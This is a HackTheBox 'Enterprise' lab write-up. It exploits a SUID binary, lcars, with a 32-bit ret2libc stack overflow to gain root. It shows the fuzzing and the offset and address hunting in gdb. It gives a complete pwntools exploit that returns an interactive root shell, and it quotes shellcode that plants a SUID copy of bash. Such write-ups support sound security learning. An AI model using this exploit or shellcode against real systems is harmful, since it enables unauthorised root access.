---
layout: post
title: Bypass PIE (32-bit) - Ret2libc
description: Bypass PIE (32-bit) - Ret2libc
summary: Bypass PIE (32-bit) - Ret2libc
tags: [bof,linux,privesc]
minute: 3
---
## Overview
If most stack protections are disabled except for PIE, attacker can leverage ret2libc method to do privilege escalation.

## Environment Setup and Requirements
* SUID binary inside victim machine

```bash
-rwsr-xr-x 1 root root 12152 Sep  8  2017 /bin/lcars
```

* PIE is enabled on binary
* ASLR is disabled on victim machine
* DEP or NX bit is not set on binary
* `gdb` present on victim machine
* `pwn` tools will be used by attacker
* Ghidra will be used

## Steps
Verify stack protections.

```bash
# victim machine - ASLR is off
www-data@enterprise:/dev/shm$ cat /proc/sys/kernel/randomize_va_space 
0
www-data@enterprise:/dev/shm$ 

# attacker machine (get copy of binary) - only PIE is enabled
➜  lcars checksec ./lcars
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
➜  lcars 
```

.Try running binary and find the access code.  Do this inside victim machine.

```bash
$ ltrace lcars
# [...redacted...]
strcmp("asas\n", "picarda1")
# [...redacted...]

# access code is picarda1
```

Now that we have the access code, let's try to fuzz the binary and see where it SEGFAULT.

```bash
www-data@enterprise:/dev/shm$ lcars

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code: 
picarda1

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System



LCARS Bridge Secondary Controls -- Main Menu: 

1. Navigation
2. Ships Log
3. Science
4. Security
5. StellaCartography
6. Engineering
7. Exit
Waiting for input: 
4
Disable Security Force Fields
Enter Security Override:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[4]    111288 segmentation fault  ./lcars
www-data@enterprise:/dev/shm$ 

# We can see here that it segfaulted at option 4, security.
```

Since gdb is available inside victim machine, let's inspect the internals.

```bash
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x00000508  _init
0x00000540  strcmp@plt
0x00000550  setresuid@plt
0x00000560  printf@plt
0x00000570  fflush@plt
0x00000580  fgets@plt
0x00000590  puts@plt
0x000005a0  exit@plt
0x000005b0  __libc_start_main@plt
0x000005c0  __isoc99_scanf@plt
0x000005e0  _start
0x00000620  __x86.get_pc_thunk.bx
0x00000630  deregister_tm_clones
0x00000670  register_tm_clones
0x000006c0  __do_global_dtors_aux
0x00000710  frame_dummy
0x0000074c  __x86.get_pc_thunk.dx
0x00000750  startScreen
0x000007d4  disableForcefields
0x0000085e  main_menu
0x00000b6a  unable
0x00000ba8  bridgeAuth
0x00000c91  main
0x00000d30  __libc_csu_init
0x00000d90  __libc_csu_fini
0x00000d94  _fini
(gdb) 
```

There is some functions, but its quite hard to follow.

```bash
(gdb) disas main_menu
Dump of assembler code for function main_menu:
   0x0000085e <+0>:	push   ebp
   0x0000085f <+1>:	mov    ebp,esp
   0x00000861 <+3>:	push   ebx
   0x00000862 <+4>:	sub    esp,0x1a4
   0x00000868 <+10>:	call   0x620 <__x86.get_pc_thunk.bx>
   0x0000086d <+15>:	add    ebx,0x2793
   0x00000873 <+21>:	mov    DWORD PTR [ebp-0xd4],0x0
   0x0000087d <+31>:	call   0x750 <startScreen>
   0x00000882 <+36>:	sub    esp,0xc
   0x00000885 <+39>:	lea    eax,[ebx-0x2113]
   0x0000088b <+45>:	push   eax
   0x0000088c <+46>:	call   0x590 <puts@plt>
# [...redacted...]
   0x00000b69 <+779>:	ret    
End of assembler dump.
(gdb) 
```

So let's grab a copy and analyze the binary in Ghidra inside our attacker machine.

![](/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/31E67999-8DDB-47C7-9AD0-B5C729F144BA.png)

![](/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/924381DF-578B-4D2C-94FE-66D0689075C4.png)

There are multiple `scaf` invocations. These functions are dangerous since it doesn't have limit on how much buffer the user can put. We are interested in option 4 since that is where the SEGFAULT happened.

In Ghidra, it looks like its not calling a function,

![](/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/25666F20-6A4E-4650-B4E9-173E6F75A5C5.png)

But based from [0xdf](https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html#static-analysis), its calling `disableForcefields`. Not sure why Ghidra is showing us that way but when I checked `disableForcefields`, it has same exact lines on what Ghidra showed us under `case 4:`.

![](/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/B3207A83-BCD7-46B8-BAF8-67C49C51CC36.png)

While investigating on this, I also tried to look for `function_addr_table` as 0xdf mentioned but I didnt saw it anywhere from my Ghidra output.

![](/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/56A5AC4B-D1AD-4622-82A3-ADBF6919B975.png)

The `scanf` is accepting only a buffer size of 204. This means beyond that, we can initiate the overflow.

Moving along, since we have now a better look in whats the binary is doing inside, we can now proceed on finding the offset and constructing our payload. Do this inside attacker machine.

```bash
# outside gdb
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 250

# inside gdb
# [...redacted...]
Disable Security Force Fields
Enter Security Override:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A

Program received signal SIGSEGV, Segmentation fault.
0x31684130 in ?? ()

# outside gdb again
➜  enterprise /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x31684130          
[*] Exact match at offset 212
➜  enterprise 

# EIP offset is 212
```

Since the PIE is enabled, meaning the program code region addresses will change, we will use ret2libc method to make it easier. Our payload format would be:

```
nop + system_addr + exit_addr + binsh_addr
```

Let's go back to victim machine and find the addresses using gdb.

```bash
# Initialize binary
(gdb) b *main
Breakpoint 1 at 0xc91
(gdb) run

# Find system
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4c060 <system>

# Find exit
(gdb) p exit  
$2 = {<text variable, no debug info>} 0xf7e3faf0 <exit>

# Find /bin/sh
# NOTE: This is part is critical, there are a lot of options
#       but we need to carefully choose what to use. Since our
#       program accepts accepts a string input and a newline,
#       0x0a, we need to avoid 0x0a to prevent from breaking
#       the payload. We can choose all others except
#       0xf7f70a14. In this example, i will just choose the
#       first one which is 0xf7f6ddd5.
(gdb) find &system,+9999999, "sh"                                  
0xf7f6ddd5
0xf7f6e7e1
0xf7f70a14
0xf7f72582
warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.
4 patterns found.
```

The lcars service is reachable from attacker machine, so we will use pwn tools to generate our exploit.

```python
#!/usr/bin/env python3

from pwn import *

# eip offset = 212

system = p32(0xf7e4c060)
exit = p32(0xf7e3faf0)
binsh = p32(0xf7f72582)

path = b"A"*212 + system + exit + binsh

r = remote("10.10.10.61", 32812)
r.recvuntil("Enter Bridge Access Code:")
r.sendline("picarda1")
r.recvuntil("Waiting for input:")
r.sendline("4")
r.recvuntil("Enter Security Override:")
r.sendline(path)
r.interactive()
```

Launchine it immediately gives us a shell as root.

```bash
➜  lcars ./bof.py
# [...redacted...]

$ id
uid=0(root) gid=0(root) groups=0(root)
$ wc -c /root/root.txt
33 /root/root.txt
$  
```

## Alternatives
HTB official walkthrough do this exploitation in another way. It didn't use re2libc but It made use of environment variables and classic linux buffer overflow exploit sandwich:

```
nop + shellcode + return_addr
```

Then it runs the python script and redirect the output to a file. From there, the actual exploitation is quite odd to me:

```bash
cat payload.txt | env - /bin/lcars
```

It also asked to do the following commands before exploitation.

```bash
unset env LINES 
unset env COLUMNS
```

Here is the full python script.

```python
import struct
 # The below shellcode will copy /bin/bash to /tmp/writeup and chmod 4777 it
 # Executing it with /tmp/writeup -p will grant a root shell
 shellcode =  ""
 shellcode += "\xd9\xee\xbd\x8f\x1f\x9f\xe9\xd9\x74\x24\xf4\x5f\x29"
 shellcode += "\xc9\xb1\x16\x83\xef\xfc\x31\x6f\x15\x03\x6f\x15\x6d"
 shellcode += "\xea\xf5\xe2\x29\x8c\x58\x93\xa1\x83\x3f\xd2\xd6\xb4"
 shellcode += "\x90\x97\x70\x45\x87\x78\xe2\x2c\x39\x0e\x01\xfc\x2d"
 shellcode += "\x23\xc5\x01\xae\x27\xb5\x21\x81\xc5\x5c\x4c\xf2\x6b"
 shellcode += "\xff\xe3\x64\x4c\xd0\x77\x18\xfc\x01\x0f\x90\x95\x29"
 shellcode += "\x8a\x21\x16\xea\x74\xa9\xbe\x61\x1a\x49\x1f\x4d\xd3"
 shellcode += "\xa6\x68\x8d\x34\xbd\xfb\xbd\x65\x4a\x76\x54\x0e\xd1"
 shellcode += "\x03\xd6\xee\x4e\xbf\x9f\x0e\xbd\xbf"
addr = struct.pack('<L', 0xffffdd60)
padding = 212
nops = "\x90" * 70
payload = "picarda1\n4\n"
payload += nops
payload += shellcode
payload += "A" * (padding - len(nops) - len(shellcode))
payload += addr
payload += "\n"
print payload
```

This is similar to the first approach I tried not including the ENV stuff, but mine was not working for some reasons.

## References
* [HTB: Enterprise | 0xdf hacks stuff](https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html#shell-as-root)